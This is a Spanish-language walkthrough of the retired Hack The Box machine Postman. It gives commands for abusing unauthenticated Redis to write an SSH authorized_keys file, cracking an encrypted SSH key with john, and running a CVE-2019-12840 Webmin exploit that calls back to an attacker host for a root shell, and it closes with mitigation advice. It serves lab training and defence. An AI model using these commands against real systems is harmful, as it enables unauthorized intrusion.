---
machine: Postman
os: Linux
difficulty: Easy
platform: Hack The Box
state: Retired
tags: [linux, redis, ssh, webmin, cve-2019-12840, privesc]
---

# Postman — Hack The Box (Linux)

[🇬🇧 English](README.en.md) | **Español**

> **Estado:** Retired. Ficha de referencia; sin flags ni credenciales reales.

## TL;DR

Redis escucha sin autenticación y permite escribir un archivo en `/var/lib/redis/.ssh/authorized_keys`, lo que da acceso como `redis`. La clave SSH de `Matt` está cifrada y se crackea; su contraseña también funciona en Webmin 1.910, vulnerable a CVE-2019-12840. La explotación del panel, que corre como root, da una shell de root.

## Reconocimiento

```bash
nmap -Pn -sCV -p22,80,6379,10000 <IP>
```

- `22` SSH, `80` Apache, `6379` Redis 4.0.9 y `10000` Webmin 1.910.
- `80` muestra una página en construcción.
- Webmin solo responde por HTTPS en `10000`.

## Enumeración

Redis no requiere autenticación y permite `CONFIG SET dir` y `CONFIG SET dbfilename`. Se puede escribir en el home de `redis` con basura alrededor de la clave, que `sshd` ignora.

```bash
redis-cli -h <IP> config set dir /var/lib/redis/.ssh
redis-cli -h <IP> config set dbfilename authorized_keys
cat key.txt | redis-cli -h <IP> -x set pwn
redis-cli -h <IP> save
```

## Foothold

Se entra por SSH como `redis`.

```bash
ssh -i id_rsa redis@<IP>
```

## Movimiento lateral

En `/opt` o en el home hay una clave SSH cifrada de `Matt`. `ssh2john` y `john` recuperan la passphrase; también se puede usar para `su Matt`.

```bash
ssh2john matt_id_rsa > matt.hash
john --wordlist=rockyou.txt matt.hash
su Matt
```

## Escalada de privilegios

La contraseña de `Matt` funciona en Webmin. La versión 1.910 es vulnerable a CVE-2019-12840: el parámetro `u` de `update.cgi` se pasa a `system()` y permite ejecutar comandos como root.

```bash
python3 cve-2019-12840.py -u https://<IP>:10000 -l <ATTACKER> -p 443
```

## Evidencia

- Redis sin autenticación y escritura de `authorized_keys`.
- Acceso como `redis`.
- Clave cifrada de `Matt` y cracking.
- Webmin 1.910 y CVE-2019-12840.
- Shell de root.

## Lecciones aprendidas

- Redis expuesto permite escritura arbitraria de archivos.
- Las claves SSH cifradas se crackean con diccionario.
- Reutilizar la contraseña del sistema en un panel es fatal.
- Webmin antiguo tiene RCE autenticado como root.

## Mitigación y detección

- Requerir autenticación en Redis y no exponerlo.
- Usar claves SSH con passphrase fuerte y única.
- Actualizar Webmin y separar credenciales.
- Monitorizar `CONFIG SET` y escrituras en `.ssh`.

## Referencias

- [0xdf — Postman](https://0xdf.gitlab.io/2020/03/14/htb-postman.html)
- [IppSec — Postman](https://www.youtube.com/watch?v=jJnHET1o8ZQ)
- [Hack The Box — Postman](https://app.hackthebox.com/machines/postman)
